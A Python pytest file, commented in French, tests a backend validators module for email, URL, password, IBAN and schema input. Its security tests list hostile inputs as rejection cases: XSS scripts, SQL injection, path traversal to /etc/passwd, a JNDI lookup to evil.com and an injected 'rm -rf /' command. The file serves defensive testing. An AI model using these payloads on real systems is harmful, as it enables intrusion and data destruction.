"""
🎵 Spotify AI Agent - Tests Validators Module
=============================================

Tests enterprise complets pour le module validators
avec validation de données, sécurité et performance.

🎖️ Développé par l'équipe d'experts enterprise
"""

import pytest
import re
from datetime import datetime, date
from decimal import Decimal
from unittest.mock import patch, Mock

# Import du module à tester
from backend.app.api.utils.validators import (
    validate_email,
    validate_phone,
    validate_url,
    validate_ip_address,
    validate_mac_address,
    validate_password,
    validate_username,
    validate_credit_card,
    validate_iban,
    validate_postal_code,
    validate_date,
    validate_time,
    validate_datetime,
    validate_number,
    validate_integer,
    validate_float,
    validate_string,
    validate_json,
    validate_xml,
    validate_uuid,
    validate_slug,
    validate_file_extension,
    validate_mime_type,
    validate_domain,
    validate_subdomain,
    validate_schema,
    validate_range,
    validate_length,
    validate_pattern,
    validate_enum,
    validate_required,
    validate_optional,
    custom_validator,
    ValidationError,
    ValidationResult
)

from . import TestUtils, security_test, performance_test, integration_test


class TestValidators:
    """Tests pour le module validators"""
    
    def test_validate_email_valid(self):
        """Test validation emails valides"""
        valid_emails = [
            'user@example.com',
            'user.name@example.org',
            'user+tag@example.net',
            'user123@sub.example.com',
            'test.email@domain-name.co.uk',
            'unicode.café@example.com',
            'very.long.email.address@very.long.domain.name.com'
        ]
        
        for email in valid_emails:
            result = validate_email(email)
            assert result.is_valid is True, f"Email {email} devrait être valide"
            assert result.value == email.lower()  # Normalisé en minuscules
    
    def test_validate_email_invalid(self):
        """Test validation emails invalides"""
        invalid_emails = [
            'invalid',
            '@example.com',
            'user@',
            'user..name@example.com',
            'user@.example.com',
            'user@example.',
            'user name@example.com',  # Espace
            'user@ex ample.com',      # Espace dans domaine
            'user@[192.168.1.1]',    # IP dans brackets (selon règles)
            ''
        ]
        
        for email in invalid_emails:
            result = validate_email(email)
            assert result.is_valid is False, f"Email {email} devrait être invalide"
            assert result.errors is not None
    
    def test_validate_email_security(self):
        """Test validation email sécurité"""
        suspicious_emails = [
            'user@localhost',              # Domaine local
            'admin@192.168.1.1',         # IP privée
            'test@evil.com@trusted.com',  # Double @
            'user+<script>@example.com'   # Script injection
        ]
        
        for email in suspicious_emails:
            result = validate_email(email, security_check=True)
            assert result.is_valid is False, f"Email suspect {email} devrait être rejeté"
    
    def test_validate_phone_valid(self):
        """Test validation téléphones valides"""
        valid_phones = [
            '+33123456789',           # International
            '+1-555-123-4567',        # US avec tirets
            '+44 20 7946 0958',       # UK avec espaces
            '0123456789',             # National français
            '(555) 123-4567',         # Format US avec parenthèses
            '+86 138 0013 8000'       # Chine
        ]
        
        for phone in valid_phones:
            result = validate_phone(phone)
            assert result.is_valid is True, f"Téléphone {phone} devrait être valide"
            assert result.value is not None
    
    def test_validate_phone_invalid(self):
        """Test validation téléphones invalides"""
        invalid_phones = [
            '123',                    # Trop court
            'abcdefghij',            # Lettres
            '+33 12 34',             # Trop court
            '+999 123 456 789',      # Code pays invalide
            ''
        ]
        
        for phone in invalid_phones:
            result = validate_phone(phone)
            assert result.is_valid is False, f"Téléphone {phone} devrait être invalide"
    
    def test_validate_url_valid(self):
        """Test validation URLs valides"""
        valid_urls = [
            'https://example.com',
            'http://subdomain.example.org/path',
            'https://api.service.com:8443/v1/endpoint?param=value',
            'ftp://files.example.com/download',
            'https://example.com/path/to/resource.html#section'
        ]
        
        for url in valid_urls:
            result = validate_url(url)
            assert result.is_valid is True, f"URL {url} devrait être valide"
    
    def test_validate_url_invalid(self):
        """Test validation URLs invalides"""
        invalid_urls = [
            'not-a-url',
            'http://',
            'https://.',
            'ftp://',
            ''
        ]
        
        for url in invalid_urls:
            result = validate_url(url)
            assert result.is_valid is False, f"URL {url} devrait être invalide"
    
    @security_test
    def test_validate_url_security(self):
        """Test validation URL sécurité"""
        malicious_urls = [
            'javascript:alert("XSS")',
            'data:text/html,<script>alert("XSS")</script>',
            'file:///etc/passwd',
            'https://user:pass@evil.com@trusted.com'
        ]
        
        for url in malicious_urls:
            result = validate_url(url, security_check=True)
            assert result.is_valid is False, f"URL malveillante {url} devrait être rejetée"
    
    def test_validate_ip_address_valid(self):
        """Test validation adresses IP valides"""
        valid_ipv4 = [
            '192.168.1.1',
            '8.8.8.8',
            '255.255.255.255',
            '0.0.0.0'
        ]
        
        valid_ipv6 = [
            '2001:0db8:85a3:0000:0000:8a2e:0370:7334',
            '2001:db8:85a3::8a2e:370:7334',  # Compressed
            '::1',                            # Loopback
            '::'                              # All zeros
        ]
        
        for ip in valid_ipv4:
            result = validate_ip_address(ip, version=4)
            assert result.is_valid is True, f"IPv4 {ip} devrait être valide"
        
        for ip in valid_ipv6:
            result = validate_ip_address(ip, version=6)
            assert result.is_valid is True, f"IPv6 {ip} devrait être valide"
    
    def test_validate_ip_address_invalid(self):
        """Test validation adresses IP invalides"""
        invalid_ips = [
            '256.256.256.256',        # IPv4 hors limites
            '192.168.1',              # IPv4 incomplet
            '192.168.1.1.1',         # IPv4 trop long
            'gggg::1',                # IPv6 caractères invalides
            '2001:0db8:85a3::8a2e:370g:7334',  # IPv6 invalide
            'not-an-ip'
        ]
        
        for ip in invalid_ips:
            result = validate_ip_address(ip)
            assert result.is_valid is False, f"IP {ip} devrait être invalide"
    
    def test_validate_mac_address_valid(self):
        """Test validation adresses MAC valides"""
        valid_macs = [
            '00:1B:44:11:3A:B7',      # Format standard
            '00-1B-44-11-3A-B7',      # Format avec tirets
            '001B.4411.3AB7',         # Format Cisco
            '001b44113ab7'            # Format compact
        ]
        
        for mac in valid_macs:
            result = validate_mac_address(mac)
            assert result.is_valid is True, f"MAC {mac} devrait être valide"
    
    def test_validate_mac_address_invalid(self):
        """Test validation adresses MAC invalides"""
        invalid_macs = [
            '00:1B:44:11:3A',         # Trop court
            '00:1B:44:11:3A:B7:FF',   # Trop long
            'GG:1B:44:11:3A:B7',      # Caractères invalides
            '00:1B:44:11:3A:B7:',     # Format incorrect
            ''
        ]
        
        for mac in invalid_macs:
            result = validate_mac_address(mac)
            assert result.is_valid is False, f"MAC {mac} devrait être invalide"
    
    @security_test
    def test_validate_password_strong(self):
        """Test validation mots de passe forts"""
        strong_passwords = [
            'MyStr0ng!Pass',          # Mixte avec symboles
            'C0mpl3x@P4ssw0rd2023',   # Très complexe
            'Passw0rd!123#Secure',    # Long et complexe
            'Café@123!Ñice',          # Avec unicode
        ]
        
        for password in strong_passwords:
            result = validate_password(password, strength='strong')
            assert result.is_valid is True, f"Mot de passe {password} devrait être fort"
            assert result.metadata['strength'] >= 3
    
    @security_test
    def test_validate_password_weak(self):
        """Test validation mots de passe faibles"""
        weak_passwords = [
            'password',               # Trop simple
            '123456',                 # Numérique simple
            'abc',                    # Trop court
            'PASSWORD',               # Que majuscules
            'password123',            # Commun
            'qwerty',                 # Clavier
            ''
        ]
        
        for password in weak_passwords:
            result = validate_password(password, strength='strong')
            assert result.is_valid is False, f"Mot de passe {password} devrait être rejeté"
    
    def test_validate_username_valid(self):
        """Test validation noms utilisateur valides"""
        valid_usernames = [
            'user123',
            'valid_user',
            'ValidUser',
            'user-name',
            'u',                      # Minimal
            'verylongusernamethatsstillvalid'
        ]
        
        for username in valid_usernames:
            result = validate_username(username)
            assert result.is_valid is True, f"Username {username} devrait être valide"
    
    def test_validate_username_invalid(self):
        """Test validation noms utilisateur invalides"""
        invalid_usernames = [
            '',                       # Vide
            'user@name',              # Caractères spéciaux
            'user name',              # Espace
            'user.name.',             # Point final
            'admin',                  # Réservé
            'root',                   # Réservé
            'user<script>',           # Injection
            'a' * 100                 # Trop long
        ]
        
        for username in invalid_usernames:
            result = validate_username(username, reserved_words=['admin', 'root'])
            assert result.is_valid is False, f"Username {username} devrait être invalide"
    
    def test_validate_credit_card_valid(self):
        """Test validation cartes de crédit valides"""
        valid_cards = [
            '4532015112830366',       # Visa
            '5555555555554444',       # MasterCard
            '378282246310005',        # American Express
            '6011111111111117',       # Discover
        ]
        
        for card in valid_cards:
            result = validate_credit_card(card)
            assert result.is_valid is True, f"Carte {card} devrait être valide"
            assert result.metadata['type'] is not None
    
    def test_validate_credit_card_invalid(self):
        """Test validation cartes de crédit invalides"""
        invalid_cards = [
            '1234567890123456',       # Checksum invalide
            '4532',                   # Trop court
            '453201511283036601',     # Trop long
            'abcd1234abcd1234',       # Lettres
            ''
        ]
        
        for card in invalid_cards:
            result = validate_credit_card(card)
            assert result.is_valid is False, f"Carte {card} devrait être invalide"
    
    def test_validate_iban_valid(self):
        """Test validation IBAN valides"""
        valid_ibans = [
            'FR1420041010050500013M02606',   # France
            'DE89370400440532013000',        # Allemagne
            'GB29NWBK60161331926819',        # Royaume-Uni
            'ES9121000418450200051332'       # Espagne
        ]
        
        for iban in valid_ibans:
            result = validate_iban(iban)
            assert result.is_valid is True, f"IBAN {iban} devrait être valide"
            assert result.metadata['country'] is not None
    
    def test_validate_iban_invalid(self):
        """Test validation IBAN invalides"""
        invalid_ibans = [
            'FR1420041010050500013M02607',   # Checksum invalide
            'XX1234567890123456789012',      # Pays invalide
            'FR14',                          # Trop court
            'abcdefghijklmnopqrstuvwxyz',    # Format invalide
            ''
        ]
        
        for iban in invalid_ibans:
            result = validate_iban(iban)
            assert result.is_valid is False, f"IBAN {iban} devrait être invalide"
    
    def test_validate_postal_code_valid(self):
        """Test validation codes postaux valides"""
        valid_codes = {
            'FR': ['75001', '13000', '69000'],      # France
            'US': ['90210', '10001', '12345-6789'], # USA
            'UK': ['SW1A 1AA', 'M1 1AA'],          # Royaume-Uni
            'DE': ['10115', '80331'],               # Allemagne
            'CA': ['K1A 0A6', 'M5V 3A8']          # Canada
        }
        
        for country, codes in valid_codes.items():
            for code in codes:
                result = validate_postal_code(code, country=country)
                assert result.is_valid is True, f"Code postal {code} pour {country} devrait être valide"
    
    def test_validate_postal_code_invalid(self):
        """Test validation codes postaux invalides"""
        invalid_codes = {
            'FR': ['7500A', '750', '750001'],      # France format invalide
            'US': ['ABCDE', '1234', '123456'],     # USA format invalide
            'UK': ['SW1A', 'SW1A 1AAA'],          # UK format invalide
        }
        
        for country, codes in invalid_codes.items():
            for code in codes:
                result = validate_postal_code(code, country=country)
                assert result.is_valid is False, f"Code postal {code} pour {country} devrait être invalide"
    
    def test_validate_date_valid(self):
        """Test validation dates valides"""
        valid_dates = [
            '2025-07-14',             # ISO format
            '14/07/2025',             # DD/MM/YYYY
            '07-14-2025',             # MM-DD-YYYY
            date(2025, 7, 14)         # Date object
        ]
        
        for date_val in valid_dates:
            result = validate_date(date_val)
            assert result.is_valid is True, f"Date {date_val} devrait être valide"
            assert isinstance(result.value, date)
    
    def test_validate_date_invalid(self):
        """Test validation dates invalides"""
        invalid_dates = [
            '2025-13-01',             # Mois invalide
            '2025-02-30',             # Jour invalide pour février
            '14-07-2025',             # Format ambigu
            'not-a-date',             # Format invalide
            ''
        ]
        
        for date_val in invalid_dates:
            result = validate_date(date_val)
            assert result.is_valid is False, f"Date {date_val} devrait être invalide"
    
    def test_validate_time_valid(self):
        """Test validation heures valides"""
        valid_times = [
            '14:30:00',               # HH:MM:SS
            '09:15',                  # HH:MM
            '23:59:59',               # Limite max
            '00:00:00'                # Limite min
        ]
        
        for time_val in valid_times:
            result = validate_time(time_val)
            assert result.is_valid is True, f"Heure {time_val} devrait être valide"
    
    def test_validate_time_invalid(self):
        """Test validation heures invalides"""
        invalid_times = [
            '25:00:00',               # Heure > 24
            '12:60:00',               # Minutes > 59
            '12:30:60',               # Secondes > 59
            'not-a-time',             # Format invalide
            ''
        ]
        
        for time_val in invalid_times:
            result = validate_time(time_val)
            assert result.is_valid is False, f"Heure {time_val} devrait être invalide"
    
    def test_validate_datetime_valid(self):
        """Test validation datetime valides"""
        valid_datetimes = [
            '2025-07-14T14:30:00Z',           # ISO avec timezone
            '2025-07-14 14:30:00',            # Format standard
            datetime(2025, 7, 14, 14, 30, 0), # Datetime object
            '14/07/2025 14:30'                # Format français
        ]
        
        for dt_val in valid_datetimes:
            result = validate_datetime(dt_val)
            assert result.is_valid is True, f"Datetime {dt_val} devrait être valide"
            assert isinstance(result.value, datetime)
    
    def test_validate_number_valid(self):
        """Test validation nombres valides"""
        valid_numbers = [
            42,                       # Integer
            3.14159,                  # Float
            Decimal('19.99'),         # Decimal
            '123',                    # String number
            '-45.67',                 # Negative
            '1.23e-4'                 # Scientific notation
        ]
        
        for num in valid_numbers:
            result = validate_number(num)
            assert result.is_valid is True, f"Nombre {num} devrait être valide"
            assert isinstance(result.value, (int, float, Decimal))
    
    def test_validate_number_invalid(self):
        """Test validation nombres invalides"""
        invalid_numbers = [
            'not-a-number',
            'abc123',
            '',
            'inf',                    # Infinity (selon règles)
            'NaN'                     # Not a Number
        ]
        
        for num in invalid_numbers:
            result = validate_number(num)
            assert result.is_valid is False, f"Nombre {num} devrait être invalide"
    
    def test_validate_integer_range(self):
        """Test validation entiers avec plage"""
        result = validate_integer(50, min_value=0, max_value=100)
        assert result.is_valid is True
        
        result = validate_integer(-10, min_value=0, max_value=100)
        assert result.is_valid is False
        
        result = validate_integer(150, min_value=0, max_value=100)
        assert result.is_valid is False
    
    def test_validate_string_constraints(self):
        """Test validation string avec contraintes"""
        # Longueur
        result = validate_string('Hello', min_length=3, max_length=10)
        assert result.is_valid is True
        
        result = validate_string('Hi', min_length=3, max_length=10)
        assert result.is_valid is False
        
        # Pattern
        result = validate_string('ABC123', pattern=r'^[A-Z0-9]+$')
        assert result.is_valid is True
        
        result = validate_string('abc123', pattern=r'^[A-Z0-9]+$')
        assert result.is_valid is False
    
    def test_validate_json_valid(self):
        """Test validation JSON valide"""
        valid_json = [
            '{"key": "value"}',
            '[1, 2, 3]',
            '"string"',
            'true',
            'null',
            '42'
        ]
        
        for json_str in valid_json:
            result = validate_json(json_str)
            assert result.is_valid is True, f"JSON {json_str} devrait être valide"
            assert result.value is not None
    
    def test_validate_json_invalid(self):
        """Test validation JSON invalide"""
        invalid_json = [
            '{key: "value"}',         # Clé sans quotes
            "{'key': 'value'}",       # Simple quotes
            '{',                      # JSON incomplet
            '',                       # Vide
            'undefined'               # JavaScript mais pas JSON
        ]
        
        for json_str in invalid_json:
            result = validate_json(json_str)
            assert result.is_valid is False, f"JSON {json_str} devrait être invalide"
    
    def test_validate_xml_valid(self):
        """Test validation XML valide"""
        valid_xml = [
            '<root></root>',
            '<root><child>value</child></root>',
            '<?xml version="1.0"?><root><item id="1">Test</item></root>',
            '<root attr="value"/>'
        ]
        
        for xml_str in valid_xml:
            result = validate_xml(xml_str)
            assert result.is_valid is True, f"XML {xml_str} devrait être valide"
    
    def test_validate_xml_invalid(self):
        """Test validation XML invalide"""
        invalid_xml = [
            '<root>',                 # Tag non fermé
            '<root></different>',     # Tags mal appariés
            '<root><child></root>',   # Nesting incorrect
            '',                       # Vide
            'not xml'                 # Texte simple
        ]
        
        for xml_str in invalid_xml:
            result = validate_xml(xml_str)
            assert result.is_valid is False, f"XML {xml_str} devrait être invalide"
    
    def test_validate_uuid_valid(self):
        """Test validation UUID valides"""
        valid_uuids = [
            '550e8400-e29b-41d4-a716-446655440000',  # UUID4
            '6ba7b810-9dad-11d1-80b4-00c04fd430c8',  # UUID1
            '6ba7b811-9dad-11d1-80b4-00c04fd430c8',  # Variant
            '00000000-0000-0000-0000-000000000000'   # Nil UUID
        ]
        
        for uuid_str in valid_uuids:
            result = validate_uuid(uuid_str)
            assert result.is_valid is True, f"UUID {uuid_str} devrait être valide"
    
    def test_validate_uuid_invalid(self):
        """Test validation UUID invalides"""
        invalid_uuids = [
            '550e8400-e29b-41d4-a716',              # Trop court
            '550e8400-e29b-41d4-a716-44665544000g', # Caractère invalide
            'not-a-uuid',                           # Format invalide
            ''
        ]
        
        for uuid_str in invalid_uuids:
            result = validate_uuid(uuid_str)
            assert result.is_valid is False, f"UUID {uuid_str} devrait être invalide"
    
    def test_validate_slug_valid(self):
        """Test validation slugs valides"""
        valid_slugs = [
            'valid-slug',
            'another_slug',
            'slug123',
            'very-long-slug-with-many-words',
            'simple'
        ]
        
        for slug in valid_slugs:
            result = validate_slug(slug)
            assert result.is_valid is True, f"Slug {slug} devrait être valide"
    
    def test_validate_slug_invalid(self):
        """Test validation slugs invalides"""
        invalid_slugs = [
            'Invalid Slug',           # Espaces
            'slug@invalid',           # Caractères spéciaux
            '-start-slug',            # Commence par tiret
            'end-slug-',              # Finit par tiret
            '',                       # Vide
            'UPPERCASE'               # Majuscules (selon règles)
        ]
        
        for slug in invalid_slugs:
            result = validate_slug(slug)
            assert result.is_valid is False, f"Slug {slug} devrait être invalide"
    
    def test_validate_file_extension_valid(self):
        """Test validation extensions fichier valides"""
        valid_extensions = [
            '.txt',
            '.pdf',
            '.docx',
            '.jpg',
            '.png',
            '.mp3',
            '.zip'
        ]
        
        allowed = ['.txt', '.pdf', '.jpg', '.png']
        
        for ext in ['.txt', '.pdf', '.jpg', '.png']:
            result = validate_file_extension(ext, allowed_extensions=allowed)
            assert result.is_valid is True, f"Extension {ext} devrait être valide"
    
    def test_validate_file_extension_invalid(self):
        """Test validation extensions fichier invalides"""
        dangerous_extensions = ['.exe', '.bat', '.com', '.scr']
        allowed = ['.txt', '.pdf', '.jpg', '.png']
        
        for ext in dangerous_extensions:
            result = validate_file_extension(ext, allowed_extensions=allowed)
            assert result.is_valid is False, f"Extension {ext} devrait être rejetée"
    
    def test_validate_schema_basic(self):
        """Test validation schema basique"""
        schema = {
            'name': {'type': str, 'required': True, 'min_length': 2},
            'age': {'type': int, 'required': True, 'min_value': 0, 'max_value': 120},
            'email': {'type': str, 'required': True, 'validator': validate_email}
        }
        
        valid_data = {
            'name': 'John Doe',
            'age': 30,
            'email': 'john@example.com'
        }
        
        result = validate_schema(valid_data, schema)
        assert result.is_valid is True
        assert len(result.errors) == 0
    
    def test_validate_schema_errors(self):
        """Test validation schema avec erreurs"""
        schema = {
            'name': {'type': str, 'required': True, 'min_length': 2},
            'age': {'type': int, 'required': True, 'min_value': 0, 'max_value': 120},
            'email': {'type': str, 'required': True, 'validator': validate_email}
        }
        
        invalid_data = {
            'name': 'J',                    # Trop court
            'age': 150,                     # Trop élevé
            'email': 'invalid-email'        # Format invalide
        }
        
        result = validate_schema(invalid_data, schema)
        assert result.is_valid is False
        assert len(result.errors) >= 3
    
    def test_validate_range_numeric(self):
        """Test validation plage numérique"""
        result = validate_range(50, min_value=0, max_value=100)
        assert result.is_valid is True
        
        result = validate_range(-10, min_value=0, max_value=100)
        assert result.is_valid is False
        
        result = validate_range(150, min_value=0, max_value=100)
        assert result.is_valid is False
    
    def test_validate_length_string(self):
        """Test validation longueur string"""
        result = validate_length('Hello', min_length=3, max_length=10)
        assert result.is_valid is True
        
        result = validate_length('Hi', min_length=3, max_length=10)
        assert result.is_valid is False
        
        result = validate_length('Very long string', min_length=3, max_length=10)
        assert result.is_valid is False
    
    def test_validate_pattern_regex(self):
        """Test validation pattern regex"""
        pattern = r'^[A-Z][a-z]+$'  # Commence par majuscule, puis minuscules
        
        result = validate_pattern('Hello', pattern)
        assert result.is_valid is True
        
        result = validate_pattern('hello', pattern)
        assert result.is_valid is False
        
        result = validate_pattern('HELLO', pattern)
        assert result.is_valid is False
    
    def test_validate_enum_choices(self):
        """Test validation enum avec choix"""
        choices = ['red', 'green', 'blue']
        
        result = validate_enum('red', choices)
        assert result.is_valid is True
        
        result = validate_enum('yellow', choices)
        assert result.is_valid is False
    
    def test_validate_required_field(self):
        """Test validation champ requis"""
        result = validate_required('value')
        assert result.is_valid is True
        
        result = validate_required('')
        assert result.is_valid is False
        
        result = validate_required(None)
        assert result.is_valid is False
        
        result = validate_required('   ')  # Espaces seulement
        assert result.is_valid is False
    
    def test_validate_optional_field(self):
        """Test validation champ optionnel"""
        result = validate_optional('value')
        assert result.is_valid is True
        
        result = validate_optional('')
        assert result.is_valid is True  # Optionnel donc OK
        
        result = validate_optional(None)
        assert result.is_valid is True  # Optionnel donc OK
    
    def test_custom_validator_function(self):
        """Test validateur personnalisé"""
        def validate_even_number(value):
            if not isinstance(value, int):
                return ValidationResult(False, None, ["Must be an integer"])
            if value % 2 != 0:
                return ValidationResult(False, value, ["Must be even"])
            return ValidationResult(True, value)
        
        # Test avec validateur personnalisé
        result = validate_even_number(4)
        assert result.is_valid is True
        
        result = validate_even_number(5)
        assert result.is_valid is False
        assert "even" in result.errors[0].lower()
    
    @performance_test
    def test_validation_performance(self):
        """Test performance validation"""
        emails = [f'user{i}@example{i}.com' for i in range(1000)]
        
        def validate_all_emails():
            results = []
            for email in emails:
                result = validate_email(email)
                results.append(result)
            return len(results)
        
        TestUtils.assert_performance(validate_all_emails, max_time_ms=500)
    
    @integration_test
    def test_complete_validation_workflow(self):
        """Test workflow validation complet"""
        # Scénario: Validation formulaire utilisateur
        
        user_schema = {
            'username': {
                'type': str,
                'required': True,
                'min_length': 3,
                'max_length': 20,
                'pattern': r'^[a-zA-Z0-9_-]+$',
                'validator': validate_username
            },
            'email': {
                'type': str,
                'required': True,
                'validator': validate_email
            },
            'password': {
                'type': str,
                'required': True,
                'validator': lambda p: validate_password(p, strength='strong')
            },
            'phone': {
                'type': str,
                'required': False,
                'validator': validate_phone
            },
            'age': {
                'type': int,
                'required': True,
                'min_value': 13,
                'max_value': 120
            },
            'website': {
                'type': str,
                'required': False,
                'validator': validate_url
            }
        }
        
        # Données utilisateur valides
        valid_user = {
            'username': 'johndoe123',
            'email': 'john.doe@example.com',
            'password': 'MyStr0ng!P@ssw0rd',
            'phone': '+33123456789',
            'age': 25,
            'website': 'https://johndoe.example.com'
        }
        
        # Données utilisateur invalides
        invalid_user = {
            'username': 'jo',                    # Trop court
            'email': 'invalid-email',            # Format invalide
            'password': 'weak',                  # Trop faible
            'phone': '123',                      # Format invalide
            'age': 150,                          # Trop élevé
            'website': 'not-a-url'              # URL invalide
        }
        
        # Test données valides
        result_valid = validate_schema(valid_user, user_schema)
        assert result_valid.is_valid is True
        assert len(result_valid.errors) == 0
        
        # Test données invalides
        result_invalid = validate_schema(invalid_user, user_schema)
        assert result_invalid.is_valid is False
        assert len(result_invalid.errors) >= 5  # Toutes les erreurs détectées
        
        # Test données partielles (champs optionnels manquants)
        partial_user = {
            'username': 'validuser',
            'email': 'valid@example.com',
            'password': 'ValidP@ssw0rd123',
            'age': 30
            # phone et website manquants mais optionnels
        }
        
        result_partial = validate_schema(partial_user, user_schema)
        assert result_partial.is_valid is True
        
        print("✅ Workflow validation complet validé")


# Tests de sécurité validation
class TestValidationSecurity:
    """Tests de sécurité pour les validateurs"""
    
    @security_test
    def test_injection_attacks_prevention(self):
        """Test prévention attaques injection"""
        malicious_inputs = [
            '<script>alert("XSS")</script>',
            "'; DROP TABLE users; --",
            '../../../etc/passwd',
            '${jndi:ldap://evil.com/exploit}',
            '{{7*7}}',                           # Template injection
            '__import__("os").system("rm -rf /")'  # Python injection
        ]
        
        for malicious in malicious_inputs:
            # Test avec différents validateurs
            email_result = validate_email(malicious)
            username_result = validate_username(malicious)
            url_result = validate_url(malicious)
            
            # Tous doivent rejeter les inputs malveillants
            assert email_result.is_valid is False
            assert username_result.is_valid is False
            assert url_result.is_valid is False
    
    @security_test
    def test_dos_prevention(self):
        """Test prévention attaques DoS"""
        # Input très long (potential ReDoS)
        very_long_input = 'a' * 100000
        
        start_time = time.time()
        result = validate_email(very_long_input)
        execution_time = time.time() - start_time
        
        # Doit rejeter rapidement (pas de ReDoS)
        assert result.is_valid is False
        assert execution_time < 1.0  # Moins d'une seconde
    
    @security_test
    def test_unicode_security(self):
        """Test sécurité Unicode"""
        unicode_attacks = [
            'admin\u202eadmin',              # Right-to-left override
            'café\u200bscript',              # Zero-width space
            'test\ufeffvalue',               # Byte order mark
            'normal\u0000null'               # Null byte
        ]
        
        for attack in unicode_attacks:
            result = validate_username(attack)
            # Doit gérer ou rejeter les caractères Unicode suspects
            if result.is_valid:
                # Si accepté, doit être normalisé
                assert result.value != attack or '\u0000' not in result.value


if __name__ == '__main__':
    pytest.main([__file__, '-v', '--tb=short'])
